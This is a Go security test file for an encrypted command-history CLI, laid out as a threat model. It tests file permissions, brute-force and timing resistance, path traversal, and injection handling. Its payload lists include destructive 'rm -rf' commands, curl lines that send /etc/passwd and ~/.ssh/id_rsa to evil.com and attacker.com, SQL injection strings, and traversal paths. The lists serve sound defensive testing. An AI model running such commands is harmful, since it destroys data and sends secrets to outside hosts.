package security

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/NeverVane/commandchronicles-cli/internal/config"
	"github.com/NeverVane/commandchronicles-cli/internal/storage"
	"github.com/NeverVane/commandchronicles-cli/pkg/crypto"
	"github.com/NeverVane/commandchronicles-cli/pkg/security"
	secureStorage "github.com/NeverVane/commandchronicles-cli/pkg/storage"
)

// TestThreatModel_DataAtRestProtection validates protection of stored data
func TestThreatModel_DataAtRestProtection(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping file system security tests on Windows")
	}

	t.Run("T001_DatabaseFileAccess_Unauthorized", func(t *testing.T) {
		// Threat: Unauthorized user attempts to read database file directly
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:              cfg,
			ValidatePermissions: true,
			CreateIfMissing:     true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Store encrypted data
		err = ss.Unlock("user1", "secure_password_123")
		require.NoError(t, err)

		record := storage.NewCommandRecord("export SECRET=confidential", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		err = ss.Lock()
		require.NoError(t, err)

		// Simulate unauthorized access attempt
		dbPath := filepath.Join(tmpDir, "data", "history.db")

		// File should exist but be protected
		require.FileExists(t, dbPath)

		// Check file permissions
		stat, err := os.Stat(dbPath)
		require.NoError(t, err)

		mode := stat.Mode()
		// Should be readable only by owner (0600)
		assert.Equal(t, os.FileMode(0600), mode.Perm(), "Database file should have 0600 permissions")

		// Read file content - should be encrypted
		data, err := os.ReadFile(dbPath)
		require.NoError(t, err)

		// Data should not contain plaintext secret
		assert.NotContains(t, string(data), "SECRET=confidential", "Plaintext should not be visible in database file")
		assert.NotContains(t, string(data), "export", "Command text should not be visible in database file")
	})

	t.Run("T002_BackupFileExposure", func(t *testing.T) {
		// Threat: Backup files or temporary files expose sensitive data
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		// Check for temporary files in various locations
		tempDirs := []string{
			tmpDir,
			"/tmp",
			"/var/tmp",
			os.TempDir(),
		}

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Store data that might create temporary files
		for i := 0; i < 10; i++ {
			record := storage.NewCommandRecord(fmt.Sprintf("secret_command_%d", i), 0, 100, "/tmp", "session", "host")
			_, err = ss.Store(record)
			require.NoError(t, err)
		}

		// Check for any temporary files containing plaintext
		for _, tempDir := range tempDirs {
			if _, err := os.Stat(tempDir); os.IsNotExist(err) {
				continue
			}

			err := filepath.Walk(tempDir, func(path string, info fs.FileInfo, err error) error {
				if err != nil {
					return nil // Skip files we can't access
				}

				if info.IsDir() {
					return nil
				}

				// Skip if we can't read the file
				if info.Mode().Perm()&0400 == 0 {
					return nil
				}

				// Check for suspicious file names or recent modifications
				if strings.Contains(info.Name(), "history") ||
					strings.Contains(info.Name(), "command") ||
					strings.Contains(info.Name(), "chronicle") {

					// If found, ensure no plaintext leakage
					data, err := os.ReadFile(path)
					if err == nil {
						assert.NotContains(t, string(data), "secret_command",
							"Temporary file %s should not contain plaintext commands", path)
					}
				}

				return nil
			})

			assert.NoError(t, err)
		}
	})

	t.Run("T003_KeyMaterialExposure", func(t *testing.T) {
		// Threat: Encryption keys stored in plaintext or weakly protected
		tmpDir := t.TempDir()
		sessionPath := filepath.Join(tmpDir, "session.key")

		skm := crypto.NewSessionKeyManager(sessionPath, 5*time.Minute)
		defer skm.Close()

		// Store session key
		testKey := make([]byte, 32)
		rand.Read(testKey)

		err := skm.StoreSessionKey("user1", "password123", testKey)
		require.NoError(t, err)

		// Session file should exist and be protected
		require.FileExists(t, sessionPath)

		stat, err := os.Stat(sessionPath)
		require.NoError(t, err)
		assert.Equal(t, os.FileMode(0600), stat.Mode().Perm(), "Session file should have 0600 permissions")

		// File should not contain plaintext key
		data, err := os.ReadFile(sessionPath)
		require.NoError(t, err)

		// Raw key bytes should not be present
		assert.NotContains(t, data, testKey, "Session file should not contain raw key material")
	})
}

// TestThreatModel_AuthenticationAttacks validates authentication security
func TestThreatModel_AuthenticationAttacks(t *testing.T) {
	t.Run("T101_BruteForceResistance", func(t *testing.T) {
		// Threat: Attacker attempts brute force password attack
		kd := crypto.NewKeyDerivator()

		// Measure time for legitimate operations
		start := time.Now()
		validKey, err := kd.DeriveKeyFromCredentials("user1", "correct_password_123")
		require.NoError(t, err)
		defer validKey.SecureErase()
		legitimateTime := time.Since(start)

		// Ensure key derivation is computationally expensive
		assert.True(t, legitimateTime > 10*time.Millisecond,
			"Key derivation should be slow enough to resist brute force: %v", legitimateTime)

		// Test multiple wrong passwords
		wrongPasswords := []string{
			"password",
			"123456",
			"admin",
			"wrong_password_123",
			"correct_password_124",
		}

		for _, wrongPass := range wrongPasswords {
			start := time.Now()
			match, err := kd.VerifyPassword(wrongPass, validKey)
			elapsed := time.Since(start)

			require.NoError(t, err)
			assert.False(t, match, "Wrong password should not match")

			// Wrong password should take similar time (constant-time comparison)
			timeDiff := elapsed - legitimateTime
			if timeDiff < 0 {
				timeDiff = -timeDiff
			}

			// Allow 50% variance for timing differences
			maxDiff := legitimateTime / 2
			assert.True(t, timeDiff <= maxDiff,
				"Timing attack vulnerability: legitimate=%v, wrong=%v, diff=%v",
				legitimateTime, elapsed, timeDiff)
		}
	})

	t.Run("T102_SessionHijackingPrevention", func(t *testing.T) {
		// Threat: Attacker attempts to hijack or replay sessions
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			AutoLockTimeout: 1 * time.Second, // Short timeout for testing
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Establish session
		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Store some data
		record := storage.NewCommandRecord("test command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		// Wait for session timeout
		time.Sleep(2 * time.Second)

		// Operations should fail after timeout
		_, err = ss.Store(record)
		assert.Error(t, err, "Operations should fail after session timeout")

		// Re-authentication should be required
		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Now operations should work again
		_, err = ss.Store(record)
		assert.NoError(t, err)
	})

	t.Run("T103_CredentialStuffingResistance", func(t *testing.T) {
		// Threat: Attacker uses leaked credentials from other breaches
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Common leaked credentials
		commonCredentials := []struct{ username, password string }{
			{"admin", "admin"},
			{"admin", "password"},
			{"admin", "123456"},
			{"user", "user"},
			{"test", "test"},
			{"root", "root"},
			{"guest", "guest"},
		}

		// None of these should work
		for _, cred := range commonCredentials {
			err := ss.Unlock(cred.username, cred.password)
			assert.Error(t, err, "Common credentials should not work: %s/%s", cred.username, cred.password)
		}

		// Only strong, unique credentials should work
		err = ss.Unlock("unique_user_123", "ComplexPassword!@#$%^&*()_+")
		assert.NoError(t, err)
	})
}

// TestThreatModel_FileSystemAttacks validates file system security
func TestThreatModel_FileSystemAttacks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping file system attack tests on Windows")
	}

	t.Run("T201_DirectoryTraversalPrevention", func(t *testing.T) {
		// Threat: Attacker attempts directory traversal to access sensitive files
		pe := security.NewPermissionEnforcer()

		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32\\config\\sam",
			"/etc/shadow",
			"../../../../root/.ssh/id_rsa",
			"../config/../../../home/user/.bashrc",
			"./../../etc/hosts",
			"data/../../../etc/fstab",
			"\\..\\..\\..\\windows\\win.ini",
		}

		for _, path := range maliciousPaths {
			t.Run(fmt.Sprintf("path_%s", strings.ReplaceAll(path, "/", "_")), func(t *testing.T) {
				err := pe.ValidatePath(path)
				assert.Error(t, err, "Malicious path should be rejected: %s", path)
			})
		}

		// Valid paths should be accepted
		validPaths := []string{
			"data/history.db",
			"config/settings.toml",
			"logs/audit.log",
			"./valid/path.txt",
		}

		for _, path := range validPaths {
			err := pe.ValidatePath(path)
			assert.NoError(t, err, "Valid path should be accepted: %s", path)
		}
	})

	t.Run("T202_SymlinkAttackPrevention", func(t *testing.T) {
		// Threat: Attacker creates symlinks to access unauthorized files
		tmpDir := t.TempDir()

		// Create a sensitive file outside our directory
		sensitiveDir := filepath.Join(tmpDir, "sensitive")
		require.NoError(t, os.Mkdir(sensitiveDir, 0700))

		sensitiveFile := filepath.Join(sensitiveDir, "secret.txt")
		require.NoError(t, os.WriteFile(sensitiveFile, []byte("secret data"), 0600))

		// Create our data directory
		dataDir := filepath.Join(tmpDir, "data")
		require.NoError(t, os.Mkdir(dataDir, 0700))

		// Try to create a symlink to the sensitive file
		symlinkPath := filepath.Join(dataDir, "history.db")
		err := os.Symlink(sensitiveFile, symlinkPath)
		require.NoError(t, err)

		// Permission enforcer should detect and reject symlinks
		pe := security.NewPermissionEnforcer()

		// Check if file is a symlink
		stat, err := os.Lstat(symlinkPath)
		require.NoError(t, err)

		if stat.Mode()&os.ModeSymlink != 0 {
			err = pe.ValidatePath(symlinkPath)
			assert.Error(t, err, "Symlink should be rejected for security")
		}
	})

	t.Run("T203_PermissionEscalationPrevention", func(t *testing.T) {
		// Threat: Attacker attempts to escalate file permissions
		tmpDir := t.TempDir()

		pe := security.NewPermissionEnforcer()

		// Create data environment
		dataDir := filepath.Join(tmpDir, "data")
		dbPath := filepath.Join(dataDir, "history.db")
		sessionPath := filepath.Join(dataDir, "session.key")

		err := pe.SecureDataEnvironment(tmpDir, dataDir, dbPath, sessionPath)
		require.NoError(t, err)

		// Try to make files world-readable (simulate attack)
		require.NoError(t, os.WriteFile(dbPath, []byte("test data"), 0644)) // Insecure permissions

		// Validation should detect and fix insecure permissions
		err = pe.AuditFilePermissions(dbPath)
		assert.Error(t, err, "Insecure permissions should be detected")

		// Fix permissions
		err = pe.FixFilePermissions(dbPath)
		require.NoError(t, err)

		// Now should pass audit
		err = pe.AuditFilePermissions(dbPath)
		assert.NoError(t, err)

		// Verify permissions are correct
		stat, err := os.Stat(dbPath)
		require.NoError(t, err)
		assert.Equal(t, os.FileMode(0600), stat.Mode().Perm())
	})
}

// TestThreatModel_InjectionAttacks validates input sanitization
func TestThreatModel_InjectionAttacks(t *testing.T) {
	t.Run("T301_SQLInjectionPrevention", func(t *testing.T) {
		// Threat: SQL injection attacks through command data
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// SQL injection payloads
		sqlInjectionPayloads := []string{
			"'; DROP TABLE history; --",
			"' OR '1'='1",
			"'; INSERT INTO history VALUES (999, 'injected', 0, 'session', 'host', 0); --",
			"' UNION SELECT * FROM sqlite_master --",
			"'; DELETE FROM history WHERE '1'='1'; --",
			"\\'; DROP TABLE history; --",
			"' OR 1=1 LIMIT 1 --",
		}

		for _, payload := range sqlInjectionPayloads {
			t.Run(fmt.Sprintf("payload_%d", len(payload)), func(t *testing.T) {
				// Create record with injection payload
				record := storage.NewCommandRecord(payload, 0, 100, "/tmp", "session", "host")

				// Should not cause SQL injection
				result, err := ss.Store(record)
				require.NoError(t, err, "SQL injection payload should be safely stored")
				require.NotNil(t, result)

				// Verify data integrity
				retrieved, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
				require.NoError(t, err)

				// Should find our record with the exact payload (safely stored)
				found := false
				for _, r := range retrieved.Records {
					if r.Command == payload {
						found = true
						break
					}
				}
				assert.True(t, found, "Injection payload should be stored as literal text")

				// Database should still be functional
				err = ss.ValidateIntegrity()
				assert.NoError(t, err, "Database integrity should be maintained")
			})
		}
	})

	t.Run("T302_CommandInjectionPrevention", func(t *testing.T) {
		// Threat: Command injection through stored commands
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Command injection payloads
		commandInjectionPayloads := []string{
			"ls; rm -rf /",
			"echo test && rm -rf *",
			"curl http://evil.com/$(cat /etc/passwd)",
			"echo `rm -rf /tmp`",
			"$(curl -d \"$(cat ~/.ssh/id_rsa)\" http://attacker.com)",
			"history | grep password | mail attacker@evil.com",
		}

		for _, payload := range commandInjectionPayloads {
			// Store the dangerous command
			record := storage.NewCommandRecord(payload, 0, 100, "/tmp", "session", "host")
			_, err := ss.Store(record)
			require.NoError(t, err, "Dangerous command should be stored safely")

			// Retrieve and verify it's stored as literal text
			retrieved, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
			require.NoError(t, err)

			found := false
			for _, r := range retrieved.Records {
				if r.Command == payload {
					found = true
					// Verify it's stored exactly as provided
					assert.Equal(t, payload, r.Command)
					break
				}
			}
			assert.True(t, found, "Dangerous command should be stored as literal text")
		}
	})

	t.Run("T303_PathInjectionPrevention", func(t *testing.T) {
		// Threat: Path injection attacks
		pe := security.NewPermissionEnforcer()

		pathInjectionPayloads := []string{
			"valid/path\x00../../etc/passwd",
			"data/file.db\x00/etc/shadow",
			"config/settings.toml\x00/root/.ssh/id_rsa",
			"./data\x00/../../../etc/hosts",
		}

		for _, payload := range pathInjectionPayloads {
			err := pe.ValidatePath(payload)
			assert.Error(t, err, "Path injection payload should be rejected: %q", payload)
		}
	})
}

// TestThreatModel_DenialOfServiceAttacks validates DoS resistance
func TestThreatModel_DenialOfServiceAttacks(t *testing.T) {
	t.Run("T401_ResourceExhaustionPrevention", func(t *testing.T) {
		// Threat: Attacker attempts to exhaust system resources
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Test large data storage
		largeCommand := strings.Repeat("A", 1024*1024) // 1MB command

		start := time.Now()
		record := storage.NewCommandRecord(largeCommand, 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		elapsed := time.Since(start)

		if err != nil {
			// System should reject overly large data gracefully
			assert.Contains(t, err.Error(), "too large", "Should reject large data with appropriate error")
		} else {
			// If accepted, should not take excessive time
			assert.True(t, elapsed < 5*time.Second, "Large data processing should not take excessive time: %v", elapsed)
		}
	})

	t.Run("T402_MemoryExhaustionPrevention", func(t *testing.T) {
		// Threat: Memory exhaustion through repeated operations
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("user1", "password123")
		require.NoError(t, err)
		defer key.SecureErase()

		// Perform many encryption/decryption operations
		const numOperations = 1000
		data := make([]byte, 1024) // 1KB data
		rand.Read(data)

		for i := 0; i < numOperations; i++ {
			ciphertext, err := encryptor.EncryptBytes(data, key.Key)
			require.NoError(t, err)

			decrypted, err := encryptor.DecryptBytes(ciphertext, key.Key)
			require.NoError(t, err)
			assert.Equal(t, data, decrypted)

			// Simulate memory pressure detection
			if i%100 == 0 {
				runtime.GC() // Force garbage collection
			}
		}

		// Memory usage should be reasonable after operations
		var m runtime.MemStats
		runtime.ReadMemStats(&m)

		// Should not use excessive memory (adjust threshold as needed)
		assert.True(t, m.Alloc < 100*1024*1024, "Memory usage should be reasonable: %d bytes", m.Alloc)
	})

	t.Run("T403_ConcurrentAccessDoS", func(t *testing.T) {
		// Threat: DoS through excessive concurrent connections
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("user1", "password123")
		require.NoError(t, err)

		// Launch many concurrent operations
		const numGoroutines = 100
		var wg sync.WaitGroup
		var errors []error
		var errorMu sync.Mutex

		start := time.Now()

		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()

				record := storage.NewCommandRecord(fmt.Sprintf("concurrent-cmd-%d", id), 0, 100, "/tmp", "session", "host")
				_, err := ss.Store(record)
				if err != nil {
					errorMu.Lock()
					errors = append(errors, err)
					errorMu.Unlock()
				}
			}(i)
		}

		wg.Wait()
		elapsed := time.Since(start)

		// Should handle concurrent access gracefully
		assert.True(t, elapsed < 30*time.Second, "Concurrent operations should complete in reasonable time: %v", elapsed)

		// Should not have excessive errors
		assert.True(t, len(errors) < numGoroutines/2, "Should handle most concurrent requests: %d errors out of %d", len(errors), numGoroutines)
	})
}

// TestThreatModel_SideChannelAttacks validates side-channel resistance
func TestThreatModel_SideChannelAttacks(t *testing.T) {
	t.Run("T501_TimingAttackResistance", func(t *testing.T) {
		// Threat: Timing attacks on password verification
		kd := crypto.NewKeyDerivator()

		// Create a known key
		knownKey, err := kd.DeriveKeyFromCredentials("timing_user", "timing_password_123")
		require.NoError(t, err)
		defer knownKey.SecureErase()

		// Test passwords of different lengths and similarities
		testPasswords := []string{
			"timing_password_123",    // Correct password
			"timing_password_12",     // One char short
			"timing_password_1234",   // One char long
			"xxxxxxxxxxxxxxxxxxxx",   // Same length, different
			"a",                      // Very short
			strings.Repeat("x", 100), // Very long
			"TIMING_PASSWORD_123",    // Same but uppercase
		}

		var timings []time.Duration

		// Measure timing for each password
		for _, password := range testPasswords {
			start := time.Now()
			match, err := kd.VerifyPassword(password, knownKey)
			elapsed := time.Since(start)

			require.NoError(t, err)
			timings = append(timings, elapsed)

			// Only the correct password should match
			if password == "timing_password_123" {
				assert.True(t, match)
			} else {
				assert.False(t, match)
			}
		}

		// Calculate timing variance
		var totalTime time.Duration
		for _, timing := range timings {
			totalTime += timing
		}
		avgTime := totalTime / time.Duration(len(timings))

		// Check that timing variance is minimal
		for i, timing := range timings {
			variance := timing - avgTime
			if variance < 0 {
				variance = -variance
			}
			
			// Allow 20% variance to account for system noise
			maxVariance := avgTime / 5
			assert.True(t, variance <= maxVariance, 
				"Password %d timing variance too high: %v (avg: %v, max: %v)", 
				i, variance, avgTime, maxVariance)
		}
	})

	t.Run("T502_CacheTimingResistance", func(t *testing.T) {
		// Threat: Cache timing attacks on encryption operations
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("cache_user", "cache_password_123")
		require.NoError(t, err)
		defer key.SecureErase()

		// Test with data that might have different cache behavior
		testData := [][]byte{
			bytes.Repeat([]byte{0x00}, 1024), // All zeros
			bytes.Repeat([]byte{0xFF}, 1024), // All ones
			make([]byte, 1024),               // Random data
		}
		rand.Read(testData[2])

		var encryptTimes []time.Duration
		var decryptTimes []time.Duration

		// Measure encryption/decryption timing
		for _, data := range testData {
			// Encrypt
			start := time.Now()
			ciphertext, err := encryptor.EncryptBytes(data, key.Key)
			encryptTime := time.Since(start)
			require.NoError(t, err)
			encryptTimes = append(encryptTimes, encryptTime)

			// Decrypt
			start = time.Now()
			decrypted, err := encryptor.DecryptBytes(ciphertext, key.Key)
			decryptTime := time.Since(start)
			require.NoError(t, err)
			assert.Equal(t, data, decrypted)
			decryptTimes = append(decryptTimes, decryptTime)
		}

		// Check timing consistency
		checkTimingConsistency := func(times []time.Duration, operation string) {
			var total time.Duration
			for _, timing := range times {
				total += timing
			}
			avg := total / time.Duration(len(times))

			for i, timing := range times {
				variance := timing - avg
				if variance < 0 {
					variance = -variance
				}
				
				// Allow 30% variance for cache timing differences
				maxVariance := avg * 3 / 10
				assert.True(t, variance <= maxVariance,
					"%s timing variance too high for data %d: %v (avg: %v)", 
					operation, i, variance, avg)
			}
		}

		checkTimingConsistency(encryptTimes, "encryption")
		checkTimingConsistency(decryptTimes, "decryption")
	})
}

// TestThreatModel_DataExfiltrationPrevention validates data exfiltration protection
func TestThreatModel_DataExfiltrationPrevention(t *testing.T) {
	t.Run("T601_UnauthorizedDataAccess", func(t *testing.T) {
		// Threat: Unauthorized access to command history data
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// User1 stores sensitive data
		err = ss.Unlock("user1", "user1_password_123")
		require.NoError(t, err)

		sensitiveRecord := storage.NewCommandRecord("export SECRET_API_KEY=abcd1234", 0, 100, "/tmp", "user1-session", "host")
		_, err = ss.Store(sensitiveRecord)
		require.NoError(t, err)

		err = ss.Lock()
		require.NoError(t, err)

		// User2 attempts to access user1's data
		err = ss.Unlock("user2", "user2_password_123")
		require.NoError(t, err)

		// Should not be able to access user1's data
		result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
		require.NoError(t, err)

		// Should see empty results or only user2's data
		for _, record := range result.Records {
			assert.NotEqual(t, "export SECRET_API_KEY=abcd1234", record.Command,
				"User2 should not see user1's sensitive data")
		}
	})

	t.Run("T602_ProcessMemoryDumping", func(t *testing.T) {
		// Threat: Memory dumping to extract sensitive data
		kd := crypto.NewKeyDerivator()
		encryptor := crypto.NewEncryptor()

		// Create keys and encrypt data
		key, err := kd.DeriveKeyFromCredentials("memtest", "memtest_password_123")
		require.NoError(t, err)

		sensitiveData := []byte("VERY SENSITIVE COMMAND DATA")
		ciphertext, err := encryptor.EncryptBytes(sensitiveData, key.Key)
		require.NoError(t, err)

		// Simulate processing
		decrypted, err := encryptor.DecryptBytes(ciphertext, key.Key)
		require.NoError(t, err)
		assert.Equal(t, sensitiveData, decrypted)

		// Secure erase sensitive data
		key.SecureErase()

		// Clear sensitive variables
		for i := range decrypted {
			decrypted[i] = 0
		}
		for i := range sensitiveData {
			sensitiveData[i] = 0
		}

		// Force garbage collection
		runtime.GC()
		runtime.GC()

		// In a real scenario, we would check memory dumps for sensitive data
		// This is a basic test to ensure secure erase works
		assert.True(t, true, "Memory cleanup completed without panics")
	})
}

// TestThreatModel_ComplianceValidation validates compliance requirements
func TestThreatModel_ComplianceValidation(t *testing.T) {
	t.Run("T701_DataRetentionCompliance", func(t *testing.T) {
		// Validate data retention and deletion capabilities
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:             cfg,
			EnableSecureDelete: true,
			CreateIfMissing:    true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("compliance_user", "compliance_password_123")
		require.NoError(t, err)

		// Store records
		records := []string{
			"personal_data_command_1",
			"personal_data_command_2",
			"personal_data_command_3",
		}

		var recordIDs []int64
		for _, cmd := range records {
			record := storage.NewCommandRecord(cmd, 0, 100, "/tmp", "session", "host")
			result, err := ss.Store(record)
			require.NoError(t, err)
			recordIDs = append(recordIDs, result.RecordID)
		}

		// Verify data exists
		result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
		require.NoError(t, err)
		assert.Len(t, result.Records, 3)

		// Secure deletion (compliance requirement)
		err = ss.Delete(recordIDs)
		require.NoError(t, err)

		// Verify data is completely deleted
		result, err = ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
		require.NoError(t, err)
		assert.Len(t, result.Records, 0)

		// Verify no traces in database file
		err = ss.Lock()
		require.NoError(t, err)

		dbPath := filepath.Join(tmpDir, "data", "history.db")
		if _, err := os.Stat(dbPath); err == nil {
			data, err := os.ReadFile(dbPath)
			if err == nil {
				for _, cmd := range records {
					assert.NotContains(t, string(data), cmd,
						"Deleted data should not be recoverable from database file")
				}
			}
		}
	})

	t.Run("T702_AuditLoggingValidation", func(t *testing.T) {
		// Validate audit logging capabilities
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)
		cfg.Security.SecureMemoryClear = true

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Perform auditable operations
		err = ss.Unlock("audit_user", "audit_password_123")
		require.NoError(t, err)

		record := storage.NewCommandRecord("audited_command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		_, err = ss.Retrieve(&secureStorage.QueryOptions{Limit: 1})
		require.NoError(t, err)

		// Check if audit events would be logged
		// (In a real implementation, you would verify actual audit log entries)
		stats := ss.GetStats()
		assert.Greater(t, stats.RecordsStored, int64(0))
		assert.Greater(t, stats.RecordsRetrieved, int64(0))
	})
}

// TestThreatModel_NetworkSecurityValidation validates network-related security
func TestThreatModel_NetworkSecurityValidation(t *testing.T) {
	t.Run("T801_DataInTransitProtection", func(t *testing.T) {
		// Validate that sensitive data is protected during any network operations
		// Note: This application is primarily local, but we validate that
		// no sensitive data would be transmitted in plaintext

		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("network_user", "network_password_123")
		require.NoError(t, err)
		defer key.SecureErase()

		sensitiveCommand := "curl -H 'Authorization: Bearer secret_token' https://api.example.com/data"
		record := storage.NewCommandRecord(sensitiveCommand, 0, 100, "/tmp", "session", "host")

		// Encrypt data (simulating any network transmission)
		ciphertext, err := encryptor.EncryptRecord(record, key.Key)
		require.NoError(t, err)

		// Verify sensitive data is not visible in ciphertext
		assert.NotContains(t, string(ciphertext), "secret_token",
			"Sensitive data should not be visible in encrypted form")
		assert.NotContains(t, string(ciphertext), "Authorization",
			"Sensitive headers should not be visible in encrypted form")
		assert.NotContains(t, string(ciphertext), "Bearer",
			"Authentication methods should not be visible in encrypted form")
	})
}

// TestThreatModel_OverallSecurityPosture validates overall security
func TestThreatModel_OverallSecurityPosture(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping comprehensive security tests on Windows")
	}

	t.Run("T901_ComprehensiveSecurityValidation", func(t *testing.T) {
		// Comprehensive security validation covering all components
		tmpDir := t.TempDir()
		cfg := createThreatTestConfig(tmpDir)

		// Enable all security features
		cfg.Security.SecureMemoryClear = true
		cfg.Security.AutoLockTimeout = 300 // 5 minutes

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:              cfg,
			AutoLockTimeout:     5 * time.Minute,
			EnableSecureDelete:  true,
			ValidatePermissions: true,
			CreateIfMissing:     true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Test complete security workflow
		username := "security_test_user"
		password := "VerySecurePassword123!@#"

		// 1. Authentication
		err = ss.Unlock(username, password)
		require.NoError(t, err)

		// 2. Store sensitive data
		sensitiveCommands := []string{
			"export DATABASE_PASSWORD=super_secret_123",
			"ssh -i ~/.ssh/production_key user@production.server.com",
			"kubectl create secret generic api-key --from-literal=key=secret123",
		}

		var storedIDs []int64
		for _, cmd := range sensitiveCommands {
			record := storage.NewCommandRecord(cmd, 0, 150, "/secure", "prod-session", "prod-host")
			result, err := ss.Store(record)
			require.NoError(t, err)
			storedIDs = append(storedIDs, result.RecordID)
		}

		// 3. Verify file permissions
		pe := security.NewPermissionEnforcer()
		dbPath := filepath.Join(tmpDir, "data", "history.db")

		if _, err := os.Stat(dbPath); err == nil {
			err = pe.AuditFilePermissions(dbPath)
			assert.NoError(t, err, "Database file should have secure permissions")

			stat, err := os.Stat(dbPath)
			require.NoError(t, err)
			assert.Equal(t, os.FileMode(0600), stat.Mode().Perm(),
				"Database should be readable only by owner")
		}

		// 4. Verify encryption integrity
		err = ss.ValidateIntegrity()
		assert.NoError(t, err, "Encrypted data should maintain integrity")

		// 5. Test data retrieval
		result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
		require.NoError(t, err)
		assert.Len(t, result.Records, 3, "Should retrieve all stored records")

		// 6. Verify no plaintext leakage in database file
		if _, err := os.Stat(dbPath); err == nil {
			dbContent, err := os.ReadFile(dbPath)
			if err == nil {
				for _, cmd := range sensitiveCommands {
					assert.NotContains(t, string(dbContent), cmd,
						"Database should not contain plaintext commands")
				}
				assert.NotContains(t, string(dbContent), "super_secret_123",
					"Database should not contain plaintext secrets")
				assert.NotContains(t, string(dbContent), "production_key",
					"Database should not contain plaintext key references")
			}
		}

		// 7. Test secure deletion
		err = ss.Delete(storedIDs[:1]) // Delete first record
		require.NoError(t, err)

		// 8. Verify deletion
		result, err = ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
		require.NoError(t, err)
		assert.Len(t, result.Records, 2, "Should have one less record after deletion")

		// 9. Lock and verify security
		err = ss.Lock()
		require.NoError(t, err)

		_, err = ss.Retrieve(&secureStorage.QueryOptions{Limit: 1})
		assert.ErrorIs(t, err, secureStorage.ErrStorageLocked,
			"Operations should fail when locked")

		// 10. Verify statistics
		stats := ss.GetStats()
		assert.Greater(t, stats.RecordsStored, int64(0))
		assert.Greater(t, stats.BytesEncrypted, int64(0))
		assert.Equal(t, int64(0), stats.SecurityViolations)
	})
}

// Helper function for creating test configuration
func createThreatTestConfig(tmpDir string) *config.Config {
	return &config.Config{
		Database: config.DatabaseConfig{
